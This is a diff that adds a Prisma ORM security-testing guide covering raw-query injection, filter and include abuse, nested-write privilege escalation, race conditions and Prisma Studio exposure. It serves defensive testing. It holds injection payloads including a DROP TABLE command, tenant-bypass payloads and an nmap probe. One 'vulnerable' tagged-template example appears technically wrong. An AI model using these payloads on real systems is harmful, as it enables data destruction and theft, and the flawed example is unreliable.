@@ -1,0 +1,393 @@
+<prisma_security_guide>
+<title>PRISMA ORM SECURITY TESTING</title>
+
+<critical>Prisma is a modern TypeScript/JavaScript ORM used extensively in Node.js applications. While Prisma provides parameterized queries by default, security vulnerabilities arise from raw query usage, schema exposure, improper access control, and client configuration issues. Understanding Prisma's query patterns is essential for testing modern Node.js applications.</critical>
+
+<scope>
+- Raw query injection (prisma.$queryRaw, $executeRaw)
+- Schema and model exposure
+- Access control bypass via query manipulation
+- Relation traversal attacks
+- Transaction and concurrency issues
+- Prisma Studio exposure
+- Connection string leakage
+- Batch operation abuse
+</scope>
+
+<methodology>
+1. Identify Prisma usage patterns in the application.
+2. Test for raw query injection vectors.
+3. Probe for schema exposure and introspection.
+4. Test access control on relations and nested queries.
+5. Check for Prisma Studio and admin interface exposure.
+</methodology>
+
+<identification>
+<prisma_indicators>
+{% raw %}
+# Prisma usage indicators in codebase:
+# - prisma/ directory with schema.prisma
+# - @prisma/client imports
+# - PrismaClient instantiation
+# - Prisma-specific error messages
+
+# Error message patterns:
+"PrismaClientKnownRequestError"
+"PrismaClientValidationError"
+"P2002: Unique constraint failed"
+"P2025: Record not found"
+
+# GraphQL + Prisma (common stack):
+# Nexus, TypeGraphQL, Pothos integrations
+{% endraw %}
+</prisma_indicators>
+
+<schema_exposure>
+{% raw %}
+# Prisma schema may be exposed via:
+# - Git repository access
+# - Deployment artifacts
+# - GraphQL introspection (if schema reflects Prisma models)
+# - Error messages revealing model structure
+
+# Schema file locations:
+/prisma/schema.prisma
+/src/prisma/schema.prisma
+
+# Generated types exposure:
+/node_modules/.prisma/client/
+/@prisma/client/
+{% endraw %}
+</schema_exposure>
+</identification>
+
+<raw_query_injection>
+<queryraw_attacks>
+{% raw %}
+# $queryRaw and $queryRawUnsafe are vulnerable to injection:
+
+# Vulnerable pattern:
+const result = await prisma.$queryRaw`
+  SELECT * FROM users WHERE email = '${userInput}'
+`;
+
+# Safe pattern (with tagged template):
+const result = await prisma.$queryRaw`
+  SELECT * FROM users WHERE email = ${userInput}
+`;
+
+# Attack vectors when concatenating:
+userInput: "'; DROP TABLE users; --"
+userInput: "' OR '1'='1"
+userInput: "' UNION SELECT * FROM admin_users; --"
+
+# $queryRawUnsafe (explicitly unsafe):
+await prisma.$queryRawUnsafe(`SELECT * FROM ${table}`)
+# Table name injection possible
+{% endraw %}
+</queryraw_attacks>
+
+<executeraw_attacks>
+{% raw %}
+# $executeRaw for write operations:
+
+# Vulnerable pattern:
+await prisma.$executeRaw`
+  UPDATE users SET role = '${role}' WHERE id = ${id}
+`;
+
+# Injection:
+role: "admin'; --"
+role: "user', admin = true WHERE id = 1; --"
+
+# Bypassing Prisma's protections:
+# If string concatenation used instead of tagged templates
+{% endraw %}
+</executeraw_attacks>
+</raw_query_injection>
+
+<query_manipulation>
+<filter_bypass>
+{% raw %}
+# Prisma query filter manipulation:
+
+# Original query:
+await prisma.user.findMany({
+  where: {
+    teamId: userTeamId,
+    ...userFilters  // User-controlled filters
+  }
+});
+
+# Attack: Override teamId restriction
+userFilters: { teamId: "other-team-id" }
+userFilters: { OR: [{ teamId: "any" }] }
+
+# Nested filter injection:
+userFilters: {
+  posts: {
+    some: {
+      published: true
+    }
+  }
+}
+{% endraw %}
+</filter_bypass>
+
+<select_include_abuse>
+{% raw %}
+# Abusing select/include for data leakage:
+
+# If user controls include:
+await prisma.user.findUnique({
+  where: { id: userId },
+  include: userControlledInclude
+});
+
+# Attack: Include sensitive relations
+userControlledInclude: {
+  password: true,
+  apiKeys: true,
+  payments: true,
+  adminNotes: true
+}
+
+# Select hidden fields:
+userControlledSelect: {
+  hashedPassword: true,
+  resetToken: true,
+  ssn: true
+}
+{% endraw %}
+</select_include_abuse>
+
+<orderby_injection>
+{% raw %}
+# orderBy manipulation:
+
+# If orderBy from user input:
+await prisma.user.findMany({
+  orderBy: userOrderBy
+});
+
+# Attack: Access relations via orderBy
+userOrderBy: {
+  password: 'asc'  // May reveal password exists
+}
+
+# Timing attack via orderBy:
+userOrderBy: {
+  secretField: 'asc'  // Different timing reveals data
+}
+{% endraw %}
+</orderby_injection>
+</query_manipulation>
+
+<relation_attacks>
+<nested_writes>
+{% raw %}
+# Prisma nested writes can bypass access control:
+
+# Create with nested relations:
+await prisma.user.create({
+  data: {
+    email: userInput.email,
+    ...userInput  // User-controlled data
+  }
+});
+
+# Attack: Create admin relationship
+userInput: {
+  email: "attacker@evil.com",
+  role: { connect: { id: "admin-role-id" } },
+  permissions: { set: ["admin", "superuser"] }
+}
+
+# Connect to unauthorized resources:
+userInput: {
+  team: { connect: { id: "target-team-id" } }
+}
+{% endraw %}
+</nested_writes>
+
+<relation_traversal>
+{% raw %}
+# Traverse relations for data access:
+
+# If can specify relations:
+await prisma.post.findMany({
+  include: {
+    author: {
+      include: {
+        privateMessages: true,
+        billingInfo: true
+      }
+    }
+  }
+});
+
+# Cross-tenant data access:
+# Traverse from accessible record to inaccessible data via relations
+{% endraw %}
+</relation_traversal>
+</relation_attacks>
+
+<transaction_attacks>
+<race_conditions>
+{% raw %}
+# Interactive transactions can have race conditions:
+
+await prisma.$transaction(async (tx) => {
+  const balance = await tx.account.findUnique({...});
+  // Race window here
+  await tx.account.update({...});
+});
+
+# Attack: Send concurrent requests to exploit check-use gap
+
+# Isolation level issues:
+await prisma.$transaction([...], {
+  isolationLevel: 'ReadUncommitted'  // Weak isolation
+});
+{% endraw %}
+</race_conditions>
+</transaction_attacks>
+
+<studio_exposure>
+<prisma_studio>
+{% raw %}
+# Prisma Studio is a GUI for database access
+
+# Default port:
+http://localhost:5555
+
+# Discovery:
+nmap -p 5555 target.com
+
+# If exposed:
+# - Full database access
+# - CRUD operations
+# - Schema visibility
+# - Data export
+
+# Check for deployment:
+# Sometimes deployed accidentally in production
+{% endraw %}
+</prisma_studio>
+</studio_exposure>
+
+<connection_exposure>
+<connection_strings>
+{% raw %}
+# Prisma connection strings often exposed:
+
+# Environment variable patterns:
+DATABASE_URL="postgresql://user:password@host:5432/db"
+DATABASE_URL="mysql://user:password@host:3306/db"
+DATABASE_URL="mongodb+srv://user:password@cluster.mongodb.net/db"
+
+# Exposure vectors:
+# - .env files in git
+# - Build artifacts
+# - Error messages
+# - SSRF to metadata endpoints
+
+# Connection pooling exposure:
+# Prisma Data Proxy URLs
+{% endraw %}
+</connection_strings>
+</connection_exposure>
+
+<batch_operations>
+<batch_abuse>
+{% raw %}
+# Batch operations can bypass validation:
+
+# createMany bypass:
+await prisma.user.createMany({
+  data: userControlledArray
+});
+
+# Attack: Insert unauthorized records
+userControlledArray: [
+  { email: "admin@evil.com", role: "admin" },
+  { email: "attacker@evil.com", isVerified: true }
+]
+
+# updateMany without proper scoping:
+await prisma.post.updateMany({
+  where: { authorId: userId, ...userFilters },
+  data: userUpdateData
+});
+
+# Attack: Override authorId filter
+userFilters: { OR: [{ authorId: "any" }] }
+{% endraw %}
+</batch_abuse>
+</batch_operations>
+
+<common_payloads>
+{% raw %}
+# Raw query injection:
+"'; DROP TABLE users; --"
+"' OR '1'='1"
+"' UNION SELECT password FROM users; --"
+
+# Filter bypass:
+{ OR: [{ id: { not: null } }] }
+{ teamId: "other-team" }
+
+# Include injection:
+{ password: true, apiKeys: true }
+
+# Nested write attack:
+{ role: { connect: { name: "admin" } } }
+
+# OrderBy timing:
+{ secretField: "asc" }
+
+# Batch override:
+[{ email: "admin@evil.com", role: "admin" }]
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate raw query injection with data extraction or modification.
+2. Show filter bypass accessing other users'/tenants' data.
+3. Prove relation traversal for unauthorized data access.
+4. Document include/select abuse for sensitive field exposure.
+5. Provide evidence of schema or connection string exposure.
+</validation>
+
+<false_positives>
+- Only tagged template literals used for raw queries
+- User input not used in query construction
+- Proper access control on all Prisma operations
+- Include/select fields explicitly allowed
+- Prisma Studio not deployed in production
+</false_positives>
+
+<impact>
+- SQL/NoSQL injection via raw queries
+- Multi-tenant data breach via filter bypass
+- Privilege escalation via nested writes
+- Sensitive data exposure via relation traversal
+- Complete database access via Prisma Studio
+- Credential theft via connection string exposure
+</impact>
+
+<pro_tips>
+1. Focus on $queryRaw and $queryRawUnsafe for injection.
+2. Check if user input influences where, include, or select.
+3. Nested writes are a common access control bypass.
+4. OrderBy can reveal field existence and enable timing attacks.
+5. Look for Prisma Studio on port 5555 in all environments.
+6. Schema exposure reveals all attack surfaces.
+7. Transaction race conditions in financial/inventory logic.
+8. Batch operations often lack per-record validation.
+9. GraphQL + Prisma combinations have compounding risks.
+10. Connection strings in Vercel/Netlify environment variables.
+</pro_tips>
+
+<remember>Prisma provides parameterized queries by default, but raw queries, user-controlled filters, and nested writes create injection and access control risks. The common pattern of spreading user input into Prisma queries is particularly dangerous. Always verify that access control is enforced at every query level.</remember>
+</prisma_security_guide>
